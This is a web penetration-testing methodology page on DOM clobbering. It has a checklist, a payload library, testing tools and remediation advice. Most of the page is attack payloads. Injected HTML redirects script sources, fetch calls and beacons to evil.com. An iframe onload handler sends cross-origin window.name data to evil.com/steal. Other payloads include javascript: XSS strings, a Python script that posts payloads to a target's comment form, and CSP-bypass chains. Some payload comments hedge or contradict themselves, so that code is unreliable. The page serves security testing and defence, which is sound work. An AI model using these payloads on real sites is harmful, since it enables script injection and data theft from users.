---
title: "DOM Clobbering"
date: 2026-02-24
draft: false
---

# DOM Clobbering

> **Severity**: Medium–High | **CWE**: CWE-79, CWE-20
> **OWASP**: A03:2021 – Injection | A05:2021 – Security Misconfiguration

---

## What Is DOM Clobbering?

DOM Clobbering exploits the browser behavior where HTML elements with `id` or `name` attributes become properties on the global `window` object (and `document` object). When JavaScript code references `window.x` or `document.x` without first defining it, an attacker who can inject HTML can control that reference by injecting an element with `id="x"`.

This is **not XSS** — the payload contains no script tags and no event handlers. It bypasses many HTML sanitizers (including DOMPurify pre-patch) and works in contexts where only "safe" HTML is permitted.

```
Attack primitive:
  <img id="config">
  → window.config / document.config → HTMLImageElement (truthy)

  <a id="config" href="//evil.com">x</a>
  → window.config.toString() === "//evil.com"
  → window.config.href    === "//evil.com"

If JavaScript does:
  var src = window.config ? window.config.src : '/safe/default.js';
  → attacker controls config.src → script src injection
```

Key DOM clobbering properties:
- `id` on any element → `window[id]` and `document[id]`
- `name` on `<form>`, `<iframe>`, `<img>`, `<a>` → `window[name]`
- Nested: `<form id="x"><input name="y">` → `window.x.y` → the input element
- `href` on `<a>` / `<base>` → `.toString()` returns the href value
- Multiple elements with same id/name → `HTMLCollection`

---

## Discovery Checklist

**Phase 1 — Find Vulnerable Code Patterns**
- [ ] Search JS source for unguarded `window.*`, `document.*` property accesses
- [ ] Look for patterns: `window.config`, `window.data`, `document.appConfig`, `window.currentUser`
- [ ] Identify where these properties are used: `src`, `href`, `innerHTML`, `eval`, passed to `fetch()`
- [ ] Check for `if (window.x)` guards — truthy check only, not typeof
- [ ] Look for `Object.assign(defaults, window.config)` — merging clobbered object
- [ ] Find `<script>` includes that reference `window.*` for CDN URL construction

**Phase 2 — Find HTML Injection Points**
- [ ] Comment sections, forum posts, markdown renderers, rich text editors
- [ ] Any input that goes through an HTML sanitizer (DOMPurify, sanitize-html) — check version
- [ ] `innerHTML` assignments where user content is allowed but "sanitized"
- [ ] Template literals with user HTML, feed widgets, imported content
- [ ] Check `id` / `name` attribute injection even if tag-level injection is blocked

**Phase 3 — Construct Clobbering Chain**
- [ ] Map which `window.*` property is referenced and what method/property of it is accessed
- [ ] Identify the sink: `script.src = window.lib`, `location = window.redirect`, `fetch(window.api)`, etc.
- [ ] Choose clobbering primitive (1-level, 2-level, HTMLCollection)
- [ ] Test if sanitizer preserves `id`/`name` attributes

---

## Payload Library

### Payload 1 — 1-Level DOM Clobbering

```html
<!-- Target code: var base = window.base || 'https://trusted.com'; -->
<!-- Attacker injects: -->
<img id="base">
<!-- Now: window.base → HTMLImageElement (truthy) → fallback chain may be bypassed -->

<!-- Target code: var url = window.callback.toString(); -->
<a id="callback" href="https://evil.com/steal?c=">x</a>
<!-- window.callback.toString() === "https://evil.com/steal?c=" -->

<!-- Target code: script.src = (window.cdn || '/default') + '/app.js' -->
<a id="cdn" href="https://evil.com/js">x</a>
<!-- script.src = "https://evil.com/js/app.js" → load attacker JS -->

<!-- Target code: fetch(window.apiEndpoint + '/user') -->
<a id="apiEndpoint" href="//evil.com/capture?">x</a>
<!-- fetch("//evil.com/capture?/user") → SSRF + data exfil -->

<!-- Target code: document.config.debug && console.log(sensitiveData) -->
<!-- But config.debug truthy → info leak: -->
<form id="config"><input name="debug" value="true"></form>

<!-- name= on <a> for window: -->
<a name="csrf_token" href="FAKE_TOKEN">x</a>
<!-- If code does: headers['X-CSRF'] = window.csrf_token.toString() -->
```

### Payload 2 — 2-Level DOM Clobbering (Nested)

```html
<!-- Target code references: window.x.y  -->
<!-- Native: <form id="x"><input name="y"> gives window.x.y = input element -->

<!-- Example: window.config.url used in fetch: -->
<form id="config">
  <input name="url" value="https://evil.com/exfil">
</form>
<!-- window.config.url → input element, .toString() → not useful directly -->
<!-- BUT: if code does: fetch(window.config.url.value) → "https://evil.com/exfil" -->

<!-- More useful — <a> with name: -->
<!-- Not directly nested — use HTMLCollection trick below for .href access -->

<!-- Target: window.transport.sendBeacon URL construction -->
<form id="transport">
  <input name="url" value="//evil.com/beacon">
</form>

<!-- Clobber window.ENV.API_BASE: -->
<form id="ENV">
  <input name="API_BASE" value="https://evil.com">
</form>
<!-- If code: fetch(window.ENV.API_BASE + '/data') → exfil request -->

<!-- Clobber window.g.csrf (two levels): -->
<!-- Trick: use iframe name + anchor id to get 2 levels with .href -->
<iframe name="g" srcdoc="
  <a id='csrf' href='//evil.com/csrfbypass'>x</a>
"></iframe>
<!-- window.g → iframe element? No — window.g → window of iframe... -->
<!-- Better 2-level with href: use <a id="x"> inside another named element -->

<!-- The canonical 2-level href trick: -->
<!-- window.x.y.toString() === href_value -->
<form id="x">
  <a id="x" name="y" href="//evil.com">x</a>
</form>
<!-- window.x → HTMLCollection (two elements with id=x) -->
<!-- window.x.y → the <a> element (named access on HTMLCollection) -->
<!-- window.x.y.toString() / window.x.y.href → "//evil.com" -->
```

### Payload 3 — HTMLCollection Clobbering

```html
<!--
  When multiple elements share the same id, document[id] returns an HTMLCollection.
  HTMLCollection supports named access: collection[name]
  This enables: window.x.y where x is id and y is name attribute.
-->

<!-- Example: window.analytics.endpoint used for beacon: -->
<a id="analytics" href="//evil.com/beacon?">x</a>
<a id="analytics" name="endpoint" href="//evil.com/beacon?">x</a>
<!-- window.analytics → HTMLCollection -->
<!-- window.analytics.endpoint → second <a> element -->
<!-- window.analytics.endpoint.href → "//evil.com/beacon?" -->

<!-- Classic CSP bypass via clobbered script source: -->
<!-- Code: var scripts = window.scriptConfig || {}; loadScript(scripts.polyfill) -->
<a id="scriptConfig" href="data:,">x</a>
<a id="scriptConfig" name="polyfill" href="//evil.com/poly.js">x</a>

<!-- Clobbering .src property for img/script: -->
<!-- If code: document.getElementById('widget').setAttribute('src', window.widgetSrc) -->
<a id="widgetSrc" href="javascript:alert(document.domain)">x</a>
<!-- widgetSrc.toString() === "javascript:alert(document.domain)" -->
<!-- → setAttribute('src', 'javascript:...') on <img> → XSS on some browsers -->

<!-- Named form elements clobbering: -->
<form name="searchConfig">
  <input name="backend" value="//evil.com/search">
</form>
<!-- window.searchConfig.backend → input element -->
<!-- window.searchConfig.backend.value → "//evil.com/search" -->
<!-- If code: fetch(searchConfig.backend + '?q=' + query) → controlled URL -->
```

### Payload 4 — DOMPurify Bypass via Clobbering (Historical)

```html
<!-- DOMPurify < 2.0.17 and < 3.0.4 were vulnerable to various clobbering bypasses -->
<!-- These are patched but illustrative of the technique class -->

<!-- Bypass DOMPurify via clobbering ownerDocument: -->
<!-- DOMPurify creates a safe document via DOMParser; clobbering document properties
     can confuse internal checks -->

<!-- The clobbering-then-sink chain pattern: -->
<!-- Step 1: DOMPurify allows <a id="x" href="..."> and <form id="y"> -->
<!-- Step 2: Application JS runs and accesses window.x or window.y -->
<!-- Step 3: Clobbered property used as URL → XSS/redirect -->

<!-- Modern DOMPurify (3.x) with FORCE_BODY option — test: -->
<form id="x"><output name="innerHTML">
<img src onerror=alert(1)>
</output></form>
<!-- window.x.innerHTML → output element whose value is the img tag string? -->
<!-- Depends heavily on exact code pattern -->

<!-- Test if sanitizer preserves id/name: -->
<!-- Send this through your target's sanitization pipeline: -->
<!-- Check if <a id="test"> → document.test → not undefined -->

<!-- Safe vs unsafe sanitizer configs: -->
<!-- DOMPurify ALLOW_UNKNOWN_PROTOCOLS: true → allows javascript: in href → XSS via clobbering -->
<!-- DOMPurify default: strips javascript: but keeps id/name → still enables clobbering if sink exists -->

<!-- Mutation XSS via clobbering (mXSS): -->
<table>
  <td><a id="x"><!-- invalid nesting triggers parser repair -->
  </td>
</table>
<!-- Browser parser repair may produce different DOM than serialization → bypass filters -->
```

### Payload 5 — Clobbering window.name

```html
<!-- window.name persists across page navigation within same tab -->
<!-- If target page reads window.name after navigation: -->

<!-- Attacker page sets window.name: -->
<script>
window.name = '<img src=x onerror=alert(document.domain)>';
// Then navigate to target:
location = 'https://target.com/page-that-uses-window.name';
</script>

<!-- If target page does:
     document.getElementById('msg').innerHTML = window.name;  // ← XSS
     Or: eval(window.name)
     Or: loadScript(window.name)  -->

<!-- Test: does target use window.name? -->
<!-- Open target in iframe or popup, set window.name first -->
<script>
var w = window.open('https://target.com/dashboard');
w.name = 'test_payload';
// After load: check if name appears in DOM
</script>

<!-- Cross-origin window.name read: -->
<!-- window.name is readable cross-origin! -->
<!-- If target page sets window.name to sensitive data: -->
<iframe src="https://target.com/sensitive" onload="
  console.log(frames[0].name);  // readable cross-origin!
  fetch('https://evil.com/steal?d=' + encodeURIComponent(frames[0].name));
"></iframe>
```

### Payload 6 — Clobbering to CSP Bypass

```html
<!-- CSP: script-src 'nonce-ABC123' — no unsafe-inline, no unsafe-eval -->
<!-- If page dynamically generates a script tag and uses window.scriptNonce: -->
<!--
  Code:
  var s = document.createElement('script');
  s.nonce = window.scriptNonce || 'DEFAULT_NONCE';
  s.src = window.scriptSrc;
  document.head.appendChild(s);
-->

<!-- Attacker injects: -->
<a id="scriptNonce" href="ATTACKER_CONTROLLED_NONCE">x</a>
<a id="scriptSrc" href="https://evil.com/payload.js">x</a>

<!-- window.scriptNonce.toString() → "ATTACKER_CONTROLLED_NONCE" -->
<!-- window.scriptSrc.toString() → "https://evil.com/payload.js" -->
<!-- But: nonce must match CSP → this only works if nonce is predictable or page reflects it -->

<!-- Clobbering base tag for relative URL hijacking: -->
<!-- If page uses relative <script src="utils.js"> AND allows <base> injection: -->
<base href="https://evil.com/">
<!-- All relative URLs now resolve to evil.com -->
<!-- → <script src="utils.js"> → evil.com/utils.js → attacker-controlled JS -->
<!-- Note: <base> clobbering works even if id/name injection is not possible -->

<!-- Clobber document.currentScript.src-dependent code: -->
<!-- Some code does: var base = document.currentScript.src.split('/').slice(0,-1).join('/') -->
<!-- → uses this as base URL for further loads -->
<!-- Inject: <script id="currentScript" src="//evil.com/x.js"> won't work (CSP blocks) -->
<!-- But if code checks window.currentScript before document.currentScript: -->
<a id="currentScript" href="//evil.com/path/">x</a>
```

### Payload 7 — Automated Detection Approach

```javascript
// Inject this via any HTML injection point to discover clobberable sinks:
// Host on attacker.com, target must be loaded:

// Step 1: Enumerate all window properties before page JS runs:
const before = new Set(Object.getOwnPropertyNames(window));

// Step 2: After page JS runs, diff against known clobberable names:
// Things to look for that indicate clobbering sinks:
const suspects = [
    'config', 'settings', 'options', 'defaults', 'cfg',
    'api', 'endpoint', 'baseUrl', 'cdn', 'host',
    'callback', 'handler', 'redirect', 'returnUrl',
    'token', 'csrf', 'nonce', 'key', 'secret',
    'debug', 'dev', 'prod', 'env', 'mode',
];

suspects.forEach(name => {
    if (window[name] === undefined) {
        console.log(`[CLOBBERABLE] window.${name} is undefined — potential clobbering target`);
    }
});

// Step 3: For each undefined, check if it's used as URL/src/script:
// Read minified JS source, search for: window.CONFIG, window.APP, etc.
// DevTools → Sources → Search: window\.[a-zA-Z_$][a-zA-Z0-9_$]*\.(src|href|url|endpoint)
```

---

## Tools

```bash
# Find DOM clobbering sinks in JS source:
# Search for unguarded window property accesses:
grep -rn "window\.\(config\|settings\|options\|defaults\|data\|api\|endpoint\|base\|cdn\)" \
  --include="*.js" . | grep -v "window\.\w\+\s*=" | grep -v "//.*window\."

# Grep for patterns that suggest sink usage:
grep -rn "\.src\s*=\s*window\.\|\.href\s*=\s*window\.\|fetch(window\.\|innerHTML.*window\." \
  --include="*.js" .

# Check if sanitizer allows id/name attributes:
# Quick test with curl + DOMPurify/sanitize-html config check:
curl -s https://target.com/app.js | grep -i "dompurify\|sanitize\|ALLOWED_ATTR\|ADD_ATTR"

# DOM Invader (Burp built-in browser):
# Automatically detects DOM clobbering sinks
# Settings → DOM Invader → Enable clobbering detection

# domclob.py — manual testing helper:
# Test which id/name values are preserved after sanitization:
python3 << 'EOF'
import requests

payloads = [
    '<a id="test1" href="//evil.com">x</a>',
    '<form id="test2"><input name="value" value="evil"></form>',
    '<img id="test3" src=x>',
    '<a id="test4" name="sub" href="//evil.com">x</a>',
    '<a id="test4" href="//evil.com2">y</a>',  # duplicate id → HTMLCollection
]

for p in payloads:
    r = requests.post('https://target.com/comment', data={'body': p}, allow_redirects=False)
    print(f"Payload: {p[:50]}")
    print(f"Response: {r.status_code} — check rendered page for id/name preservation")
EOF

# Browser DevTools — detect clobbering at runtime:
# In console of target page:
(function() {
    const handler = {
        get(target, prop) {
            if (!(prop in target) && typeof prop === 'string' && prop.length > 2) {
                console.trace('[CLOBBER CANDIDATE] window.' + prop);
            }
            return Reflect.get(...arguments);
        }
    };
    // Can't proxy window directly in all browsers, but can monitor:
    Object.keys(document.all).forEach(k => {
        const el = document.all[k];
        if (el.id) console.log(`[ID] window.${el.id} → `, el.tagName);
        if (el.name) console.log(`[NAME] window.${el.name} → `, el.tagName);
    });
})();

# Find all elements with id/name in the page:
# DevTools Console:
Array.from(document.querySelectorAll('[id],[name]')).map(e => ({
    tag: e.tagName, id: e.id, name: e.name, href: e.href
}));
```

---

## Remediation Reference

- **Explicit property initialization**: always initialize configuration objects before use — `var config = window.config || {}` is still clobberable; use `var config = typeof window.config === 'object' && !Array.isArray(window.config) ? window.config : {}`
- **Avoid `window.*` for app config**: pass config via data attributes on a specific element, or via a `<script type="application/json">` block — don't read from `window` globals that HTML can shadow
- **DOMPurify configuration**: use `FORBID_ATTR: ['id', 'name']` when user-controlled HTML should not be allowed to clobber globals; or use `SANITIZE_DOM: true` (default) which mitigates some but not all clobbering
- **Sanitize `id` and `name`**: if user-controlled HTML is allowed, strip or namespace `id`/`name` attributes — prefix with `user-` to avoid collisions with code
- **CSP**: `object-src 'none'` and strict `script-src` with nonces reduce the impact of any clobbering chain that leads to script injection
- **Use `Object.create(null)`** for config objects: `var cfg = Object.create(null)` — not prototype-pollutable, but does not prevent clobbering
- **Feature detection instead of global access**: check `typeof window.x !== 'undefined'` before accessing `.src` or `.href` on it

*Part of the Web Application Penetration Testing Methodology series.*
